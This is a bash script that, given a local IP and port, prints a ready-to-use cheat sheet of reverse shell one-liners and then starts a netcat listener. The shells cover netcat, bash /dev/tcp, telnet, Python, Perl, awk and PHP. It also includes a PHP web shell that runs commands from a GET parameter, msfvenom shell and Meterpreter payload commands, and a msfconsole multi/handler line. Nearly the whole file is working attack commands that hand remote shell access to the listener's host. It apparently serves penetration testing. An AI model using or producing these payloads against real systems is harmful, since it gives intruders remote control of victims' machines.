#!/bin/bash

#Conchology:
#The scientific study or collection of mollusc shells.

# $1 ip of local machine
# $2 listening port

# List of REVERSE shells

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Display error if not enough arguments given
if [ $# -ne 2 ]; then
	printf " ${RED}Usage: ${NC} ./reverse_Concho.sh [local_ip] [local_listening_port] \n"
	exit 1
fi

printf "${YELLOW}Note that all shells are unencrypted, and may be vulnerable to interception.\n\n\n${NC}"

concho_ports_in_use=$(netstat -tln | tail -n +3 | awk '{ print $4 }' | rev | cut -d ':' -f 1 | rev | sort -u)

for i in $concho_ports_in_use;
do
	if [[ "$i" == "$2" ]]; then
		printf "${RED}Port unavailable.\n${NC}\n"
		exit 1
	fi
done
unset concho_ports_in_use

conchofilename=$(tr -dc 'A-Za-z' < /dev/urandom | fold -$((RANDOM%10+3)) | head -1)

# Netcat Reverse shells
printf ".. Netcat without '-e' RevShell ..\n.-------------------------------.\n"
printf "rm /tmp/$conchofilename; mkfifo /tmp/$conchofilename; cat /tmp/$conchofilename|/bin/sh -i 2>&1|nc $1 $2 > /tmp/$conchofilename\n"
printf ".-------------------------------.\n\n"

printf ".. Netcat with '-e' RevShell ..\n.-------------------------------.\n"
printf "nc $1 $2 -e /bin/sh\nnc.exe $1 $2 -e cmd.exe\n"
printf ".-------------------------------.\n\n"


#Command Line Shells
printf ".. Pure Bash RevShell ..\n.-------------------------------.\n"
printf "bash -i >& /dev/tcp/$1/$2 0>&1\n"
printf ".-------------------------------.\n\n"

printf ".. Telnet RevShell ..\n.-------------------------------.\n"
printf "TF=\$(mktemp -u) && mkfifo \$TF && telnet $1 $2 0<\$TF | /bin/sh 1>\$TF\n"
printf ".-------------------------------.\n\n"


printf ".. Python RevShells ..\n.-------------------------------.\n"

printf "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'\n\n"

printf "python -c 'import os;os.system(\"rm /tmp/$conchofilename; mkfifo /tmp/$conchofilename; cat /tmp/$conchofilename|/bin/sh -i 2>&1|nc $1 $2 > /tmp/$conchofilename\")'\n"

printf ".-------------------------------.\n\n"

printf ".. Perl RevShells ..\n.-------------------------------.\n"
printf "Windows-Friendly (also worked on Linux)\nperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$2\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;\'\n\n"
printf "perl -e \'use Socket;\$i=\"$1\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n\n"
printf "Doesn't rely on /bin/sh\nperl -MIO -e \'\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$2\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;\'\n"

printf ".-------------------------------.\n\n"


printf ".. awk (non-interactive) RevShell ..\n.-------------------------------.\n"
printf "awk -v RHOST=$1 -v RPORT=$2 'BEGIN {s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;while (c && (c |& getline) > 0) print \$0 |& s; close(c)}}'\n"
printf ".-------------------------------.\n\n"




printf ".. PHP CLI RevShell ..\n.-------------------------------.\n"
printf "php -r '\$sock=fsockopen(\"$1\",\"$2\");exec(\"/bin/sh -i <&3 >&3 2>&3\");\'\n"
printf ".-------------------------------.\n\n"

#PHP Shell Payloads
printf ".. PHP WebPage Microshell ..\n.-------------------------------.\n"
printf "<?php passthru(\$_GET[\"cmd\"]); ?>\n\n\n"


printf ".. PHP VisitMe RevShells ..\n.-------------------------------.\n"
printf "<?php \$sock=fsockopen(\"$1\",\"$2\"); passthru(\"/bin/sh -i <&3 >&3 2>&3\");?>\n\n"

printf "<?php passthru(\"${YELLOW}ENTER COMMANDS${NC}\"]); ?>\n\n"

printf "<?php passthru(\"rm /tmp/$conchofilename; mkfifo /tmp/$conchofilename; cat /tmp/$conchofilename|/bin/sh -i 2>&1|nc $1 $2 > /tmp/$conchofilename\"); ?>\n\n"

printf ".-------------------------------.\n\n\n"


#MSFVenom Quick Reference
printf ".. MSFVenom RevShell Quick Reference ..\n.-------------------------------.\n"
printf "!!! Remember to add bad characters and other parameters as needed !!! \n\n"

printf "Common (Stageless) MSFVenom Reverse Shells\n.-------------------------------.\n"

printf "msfvenom -p linux/${GREEN}x86${NC}/shell_reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"
printf "msfvenom -p linux/${YELLOW}x64${NC}/shell_reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"

printf "msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"
printf "msfvenom -p windows/${YELLOW}x64${NC}/shell_reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"

printf "msfvenom -p java/jsp_shell_reverse_tcp  LHOST=$1 LPORT=$2 exitfunc=thread -f war \n\n"

printf ".-------------------------------.\n\n\n"


#MSFVenom Quick Reference
printf ".. MSFVenom Meterpreter Quick Reference ..\n.-------------------------------.\n"
printf "!!! Remember to add bad characters and other parameters as needed !!! \n\n"

printf "Common Stag${YELLOW}ed${NC} Meterpreter Reverse Shells\n.-------------------------------.\n"

printf "msfvenom -p linux/${GREEN}x86${NC}/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"
printf "msfvenom -p linux/${YELLOW}x64${NC}/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"

printf "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"
printf "msfvenom -p windows/${YELLOW}x64${NC}/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"

printf "msfvenom -p java/jsp_meterpreter/reverse_tcp  LHOST=$1 LPORT=$2 exitfunc=thread -f war \n\n"

printf ".-------------------------------.\n\n\n\n"

printf "Common Stage${RED}less${NC} Meterpreter Reverse Shells\n.-------------------------------.\n"

printf "msfvenom -p linux/${GREEN}x86${NC}/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"
printf "msfvenom -p linux/${YELLOW}x64${NC}/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"

printf "msfvenom -p windows/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -a ${GREEN}x86${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"
printf "msfvenom -p windows/${YELLOW}x64${NC}/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -a ${YELLOW}x64${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"

printf "msfvenom -p java/jsp_meterpreter_reverse_tcp  LHOST=$1 LPORT=$2 exitfunc=thread -f war \n\n"

printf ".-------------------------------.\n\n\n"


printf ".. MSFConsole MultiHandler Quick Reference ..\n.-------------------------------.\n"


printf "msfconsole -q -x \"use exploit/multi/handler; set LHOST $1; set LPORT $2; set payload windows/meterpreter/reverse_tcp; set exitfunc thread; run -j\"\n\n"

unset conchofilename

printf "${GREEN}Starting simple listener with 'nc -lnvp ${YELLOW}$2'\n${NC}"
nc -lnvp $2
